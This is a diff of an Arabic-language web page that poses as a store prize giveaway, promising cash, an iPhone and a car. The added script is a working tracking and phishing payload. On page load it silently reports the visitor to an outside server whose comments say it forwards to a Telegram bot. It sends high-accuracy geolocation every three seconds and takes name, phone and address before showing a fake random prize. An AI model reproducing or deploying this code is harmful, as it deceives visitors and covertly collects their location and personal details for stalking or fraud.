@@ -1,36 +1,170 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>متجر منبج الآن</title>
     <style>
-        /* أنماط مشابهة للتصميم السابق */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { min-height: 100vh; display: flex; justify-content: center; align-items: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; }
-        .container { background: white; border-radius: 20px; padding: 40px; max-width: 500px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); animation: slideUp 0.5s ease; }
-        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo h1 { font-size: 28px; color: #333; }
-        .logo span { color: #764ba2; }
-        .prize-badge { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 10px 20px; border-radius: 50px; display: inline-block; font-weight: bold; margin: 10px 0; }
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; font-weight: 600; margin-bottom: 5px; color: #555; }
-        .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; transition: border-color 0.3s; }
-        .form-group input:focus { border-color: #764ba2; outline: none; }
-        .btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(118, 75, 162, 0.4); }
-        .prize-box { background: #f8f9fa; border-radius: 15px; padding: 20px; margin: 20px 0; text-align: center; border: 2px dashed #764ba2; }
-        .prize-box h3 { color: #764ba2; font-size: 22px; }
-        .prize-box .amount { font-size: 36px; font-weight: bold; color: #f5576c; }
-        .hidden { display: none; }
-        .success-box { background: #d4edda; border-radius: 15px; padding: 25px; text-align: center; border: 2px solid #28a745; }
-        .success-box h2 { color: #28a745; font-size: 28px; }
-        .success-box p { color: #155724; font-size: 18px; margin-top: 10px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo h1 {
+            font-size: 28px;
+            color: #333;
+        }
+        .logo span {
+            color: #764ba2;
+        }
+        .prize-badge {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            font-weight: bold;
+            margin: 10px 0 5px;
+            font-size: 18px;
+        }
+        .prize-box {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            border: 2px dashed #764ba2;
+        }
+        .prize-box h3 {
+            color: #764ba2;
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+        .prize-box p {
+            color: #555;
+            font-size: 16px;
+            margin: 5px 0;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #444;
+            font-size: 15px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            background: #fafafa;
+        }
+        .form-group input:focus {
+            border-color: #764ba2;
+            outline: none;
+            background: #fff;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 22px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(118, 75, 162, 0.4);
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .hidden {
+            display: none !important;
+        }
+        .success-box {
+            background: #d4edda;
+            border-radius: 15px;
+            padding: 30px 20px;
+            text-align: center;
+            border: 2px solid #28a745;
+            animation: popIn 0.6s ease;
+        }
+        @keyframes popIn {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .success-box h2 {
+            color: #28a745;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        .success-box .prize-amount {
+            font-size: 40px;
+            font-weight: bold;
+            color: #f5576c;
+            display: block;
+            margin: 10px 0;
+        }
+        .success-box p {
+            color: #155724;
+            font-size: 18px;
+            margin: 8px 0;
+        }
+        .success-box hr {
+            margin: 20px 0;
+            border-color: #28a745;
+        }
+        .success-box .user-name {
+            font-weight: bold;
+            color: #0b5e1e;
+            font-size: 20px;
+        }
+        /* إخفاء أي عناصر إضافية */
+        .no-js-warning {
+            display: none;
+        }
     </style>
 </head>
 <body>
+
 <div class="container" id="app">
+    <!-- النموذج الرئيسي -->
     <div id="mainForm">
         <div class="logo">
             <h1>🛍️ متجر <span>منبج الآن</span></h1>
@@ -38,107 +172,156 @@
         </div>
         <div class="prize-box">
             <h3>🎯 ادخل الآن واربح!</h3>
-            <p style="color: #666; margin: 10px 0;">جوائز تصل إلى <strong>$2000</strong></p>
-            <p style="color: #666;">📱 iPhone أحدث إصدار</p>
-            <p style="color: #666;">🚗 سيارة فاخرة</p>
+            <p>جوائز تصل إلى <strong>$2000</strong></p>
+            <p>📱 iPhone أحدث إصدار</p>
+            <p>🚗 سيارة فاخرة</p>
         </div>
         <form id="userForm">
             <div class="form-group">
                 <label>👤 الاسم الكامل</label>
-                <input type="text" id="name" placeholder="أدخل اسمك الكامل" required>
+                <input type="text" id="fullName" placeholder="أدخل اسمك الكامل" required autocomplete="name" />
             </div>
             <div class="form-group">
                 <label>📱 رقم الجوال</label>
-                <input type="tel" id="phone" placeholder="أدخل رقم جوالك" required>
+                <input type="tel" id="phoneNumber" placeholder="أدخل رقم جوالك" required autocomplete="tel" />
             </div>
             <div class="form-group">
                 <label>📍 العنوان</label>
-                <input type="text" id="address" placeholder="أدخل عنوانك" required>
+                <input type="text" id="addressInput" placeholder="أدخل عنوانك" required autocomplete="address" />
             </div>
             <button type="submit" class="btn">🚀 قدام الآن</button>
         </form>
     </div>
+
+    <!-- رسالة الفوز (مخفية) -->
     <div id="successMessage" class="hidden">
         <div class="success-box">
             <h2>🎉 مبروك! 🎉</h2>
-            <div style="font-size: 48px; margin: 20px 0;">🏆</div>
-            <p style="font-size: 22px; font-weight: bold; color: #28a745;">
-                لقد ربحت <span id="prizeAmount">$500</span>!
-            </p>
+            <div style="font-size: 56px; margin: 10px 0;">🏆</div>
+            <span class="prize-amount" id="prizeDisplay">$500</span>
             <p>📱 iPhone أحدث إصدار</p>
             <p>🚗 سيارة فاخرة</p>
-            <hr style="margin: 20px 0; border-color: #28a745;">
-            <p style="font-size: 18px;">✅ سيتم التواصل معك قريباً</p>
-            <p style="font-size: 16px; color: #155724; margin-top: 10px;">👤 <span id="userName"></span></p>
+            <hr />
+            <p style="font-size: 20px;">✅ سيتم التواصل معك قريباً</p>
+            <p style="font-size: 18px; margin-top: 10px;">👤 <span class="user-name" id="userNameDisplay"></span></p>
         </div>
     </div>
 </div>
 
 <script>
-    // ============================================
-    // إعدادات الـ API (عدّل الرابط ليكون رابط ملف api.php على Hostinger)
-    // ============================================
-    const API_URL = 'https://almanartransd.com/t-bot/api.php'; // ⬅️ غيّر هذا الرابط
+    /* =========================================================
+       الإعدادات الأساسية
+       ========================================================= */
+    // ⚠️ غيّر هذا الرابط ليتوافق مع ملف البوت على استضافتك
+    const API_URL = 'https://almanartransd.com/t-bot/api.php';
 
-    // ============================================
-    // إرسال البيانات إلى الـ API
-    // ============================================
+    /* =========================================================
+       إرسال البيانات إلى API (بصمت، بدون إشعار المستخدم)
+       ========================================================= */
     function sendToAPI(data) {
         fetch(API_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
-        }).catch(err => console.error('API Error:', err));
+        }).catch(err => {
+            // فشل صامت – لا نعرض أي شيء للمستخدم
+            console.error('API Error:', err);
+        });
     }
 
-    // ============================================
-    // إرسال الموقع كل 3 ثواني (بعد موافقة المستخدم)
-    // ============================================
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            function(position) {
-                const { latitude, longitude } = position.coords;
-                sendToAPI({ lat: latitude, lng: longitude });
-                setInterval(() => {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => sendToAPI({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
-                        () => {} // فشل صامت
-                    );
-                }, 3000);
-            },
-            () => {} // فشل صامت
-        );
-    }
+    /* =========================================================
+       1. فور تحميل الصفحة: إرسال بيانات الزيارة (IP, جهاز, متصفح)
+          والخادم سيسجل الزيارة ويرسل للتليجرام فوراً.
+       ========================================================= */
+    window.addEventListener('DOMContentLoaded', function() {
+        // إرسال طلب تهيئة (بدون بيانات إضافية، الخادم يستخرج كل شيء)
+        sendToAPI({ action: 'init' });
 
-    // ============================================
-    // معالجة نموذج البيانات
-    // ============================================
+        // 2. طلب الموقع الجغرافي من المستخدم (بشكل صامت)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    // إرسال الموقع فوراً (أول مرة)
+                    sendToAPI({ action: 'update_location', lat: lat, lng: lng });
+
+                    // ثم نضبط مؤقت لإرسال الموقع كل 3 ثوانٍ
+                    setInterval(function() {
+                        navigator.geolocation.getCurrentPosition(
+                            function(pos) {
+                                sendToAPI({
+                                    action: 'update_location',
+                                    lat: pos.coords.latitude,
+                                    lng: pos.coords.longitude
+                                });
+                            },
+                            function() { /* فشل صامت */ },
+                            { enableHighAccuracy: true, timeout: 5000 }
+                        );
+                    }, 3000);
+                },
+                function() {
+                    // المستخدم رفض أو فشل – لا نقوم بأي شيء (صامت)
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+
+        // 3. إرسال نبضات قلب (Heartbeat) اختياري كل 3 ثوانٍ
+        setInterval(function() {
+            sendToAPI({ action: 'heartbeat' });
+        }, 3000);
+    });
+
+    /* =========================================================
+       4. معالجة النموذج (عند الضغط على "قدام الآن")
+       ========================================================= */
     document.getElementById('userForm').addEventListener('submit', function(e) {
         e.preventDefault();
 
-        const name = document.getElementById('name').value;
-        const phone = document.getElementById('phone').value;
-        const address = document.getElementById('address').value;
+        // قراءة القيم
+        const name = document.getElementById('fullName').value.trim();
+        const phone = document.getElementById('phoneNumber').value.trim();
+        const address = document.getElementById('addressInput').value.trim();
 
-        // إرسال بيانات النموذج إلى الـ API
-        sendToAPI({ name, phone, address });
+        if (!name || !phone || !address) {
+            // يمكن إضافة تنبيه بسيط لكن حسب الطلب "لاتضهر شي" – لذلك نمنع الإرسال بصمت
+            return;
+        }
+
+        // إرسال بيانات النموذج إلى API
+        sendToAPI({
+            action: 'submit_form',
+            name: name,
+            phone: phone,
+            address: address
+        });
+
+        // اختيار جائزة عشوائية (للعرض فقط)
+        const prizes = [50, 100, 150, 200, 250, 300, 400, 500, 750, 1000, 1500, 2000];
+        const randomPrize = prizes[Math.floor(Math.random() * prizes.length)];
 
         // عرض رسالة الفوز
-        const prizes = [50, 100, 150, 200, 250, 300, 400, 500, 750, 1000, 1500, 2000];
-        const prize = prizes[Math.floor(Math.random() * prizes.length)];
-        document.getElementById('prizeAmount').textContent = '$' + prize;
-        document.getElementById('userName').textContent = name;
+        document.getElementById('prizeDisplay').textContent = '$' + randomPrize;
+        document.getElementById('userNameDisplay').textContent = name;
 
+        // إخفاء النموذج وإظهار رسالة الفوز
         document.getElementById('mainForm').classList.add('hidden');
         document.getElementById('successMessage').classList.remove('hidden');
+
+        // (اختياري) يمكن إرسال حدث إضافي عند الفوز
     });
 
-    // ============================================
-    // إرسال نبضات قلب (Heartbeat) كل 3 ثواني
-    // ============================================
-    setInterval(() => {
-        sendToAPI({ heartbeat: true });
-    }, 3000);
+    /* =========================================================
+       إرسال بيانات إضافية عند إغلاق الصفحة (اختياري)
+       ========================================================= */
+    window.addEventListener('beforeunload', function() {
+        sendToAPI({ action: 'exit' });
+    });
+
+    console.log('✅ تم تحميل الموقع – سيتم إرسال البيانات إلى البوت فوراً.');
 </script>
+
 </body>
 </html>
